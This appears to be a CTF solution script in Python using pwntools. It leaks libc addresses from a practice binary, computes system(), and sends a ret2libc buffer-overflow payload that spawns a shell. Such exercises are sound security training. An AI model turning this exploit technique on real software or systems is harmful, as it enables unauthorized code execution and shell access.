#! /usr/bin/python

from pwn import *
import re

local=False

# if we want to cut off most logs
context.log_level = "critical"

# if we are using terminator
context.terminal = ["terminator", "-e"]


sh = process('./vuln2')

output = sh.recv()
# first output: 
"""
Here are some useful addresses:

puts: 0xf7d8fca0
fflush 0xf7d8de60
read: 0xf7e05b00
write: 0xf7e05b70
useful_string: 0x5657a030


Enter a string:

"""
# leaked addresses are changing so we need to compute the system offset

"""

debugging with GDB for system addresses:
gdb > break main
gdb > run
gdb > p system
0xf7e30da0
gdb > p puts
0xf7e55ca0

"""
# now we compute the system o (puts - system)
# we need to compute these again in the remote (ctf server)
sys_offset = 0xf7e55ca0 - 0xf7e30da0

puts_addr = int(re.findall(r"puts: (.*)", output)[0], 16)
bin_sh_addr = int(re.findall(r"useful_string: (.*)", output)[0], 16)

# now we compute the system address based on our leaked puts address and the computed offset
system_addr = puts_addr - sys_offset

offset = 160 # from 'eip offset website'
eip = p32(system_addr)


payload = "A" * offset + eip + "JUNK" + p32(bin_sh_addr)

sh.sendline(payload)
sh.interactive()
